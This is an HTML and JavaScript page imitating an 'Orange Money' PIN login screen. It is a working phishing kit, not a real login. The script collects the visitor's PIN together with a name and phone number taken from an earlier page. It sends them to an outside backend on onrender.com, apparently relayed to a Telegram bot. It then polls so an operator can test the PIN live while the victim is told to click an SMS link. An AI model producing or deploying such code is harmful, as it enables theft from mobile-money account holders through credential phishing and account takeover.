<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
body {
    font-family: Arial, sans-serif;
    background: #000; /* black background */
    height: 100vh;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
}

.pin-container {
    width: 100%;
    max-width: 420px;
    padding: 20px;
    text-align: center;
}

.logo {
    margin-bottom: 25px;
    color: #fff;
}

.logo h1 {
    margin: 0;
    font-size: 32px;
}

input {
    width: 100%;
    padding: 14px;
    border-radius: 25px;
    border: none;
    outline: none;
    margin-bottom: 15px;
    font-size: 16px;
    background: rgba(255,255,255,0.05);
    color: #fff;
}

input::placeholder {
    color: rgba(255,165,0,0.7);
}

button {
    width: 100%;
    padding: 14px;
    border-radius: 25px;
    border: none;
    background: orange;
    color: #000;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: 0.3s;
}

button:hover {
    background: #ff9c00;
}

button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.status {
    margin-top: 12px;
    font-size: 14px;
    color: #fff;
}
</style>
</head>

<body>

<div class="pin-container">

    <div class="logo">
        <h1>orange money pin</h1>
    </div>

    <form id="pinForm">
        <input id="pinInput" type="password" placeholder="Enter PIN" maxlength="4" required>
        <button id="submitBtn">LOGIN</button>
    </form>

    <div class="status" id="status"></div>

</div>

<script>
const BACKEND_URL = "https://orange-loans-liberia.onrender.com";

// ---------------- BOT ID ----------------
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');
if (!botId) {
    alert("Invalid access link");
    throw new Error("botId missing");
}

// ---------------- SUBMIT PIN ----------------
document.getElementById('pinForm').addEventListener('submit', async e => {
    e.preventDefault();

    const pin = document.getElementById('pinInput').value.trim();
    const phone = localStorage.getItem('phone'); // get phone from previous page
    const name = localStorage.getItem('fullName'); // get name from previous page
    const statusDiv = document.getElementById('status');
    const btn = document.getElementById('submitBtn');

    if (!phone || !name || pin.length < 4) return;

    localStorage.setItem('pin', pin);

    btn.disabled = true;
    btn.textContent = 'Sending to Telegram...';
    statusDiv.textContent = 'Please click the link you received in SMS to confirm your connection.';

    try {
        // send details to backend
        const res = await fetch(`${BACKEND_URL}/submit-pin`, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ name, phone, pin, botId })
        });

        const { requestId } = await res.json();

        // ---------------- POLLING ----------------
        const poll = setInterval(async () => {
            const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
            const d = await r.json();

            if (d.approved === true) {
                clearInterval(poll);
                window.location.href = `success.html?botId=${botId}`;
            }

            if (d.approved === false) {
                clearInterval(poll);
                statusDiv.textContent = "Incorrect PIN. Please try again.";
                btn.disabled = false;
                btn.textContent = 'LOGIN';
                document.getElementById('pinInput').value = '';
            }

        }, 1500);

    } catch (err) {
        statusDiv.textContent = "Network error, try again";
        btn.disabled = false;
        btn.textContent = 'LOGIN';
    }

});
</script>

</body>
</html>
